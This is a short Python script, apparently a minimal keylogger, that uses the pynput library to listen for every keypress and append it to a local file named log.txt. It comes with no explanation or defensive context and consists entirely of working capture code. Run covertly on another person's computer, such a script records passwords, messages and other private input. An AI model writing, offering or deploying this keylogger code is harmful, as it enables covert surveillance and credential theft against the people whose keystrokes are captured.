import pynput.keyboard as keyboard
def log_file(key):
	#print(key)
	with open('log.txt','a') as f:
		f.write(str(key))
with keyboard.Listener(on_press=log_file) as listener:
      listener.join()	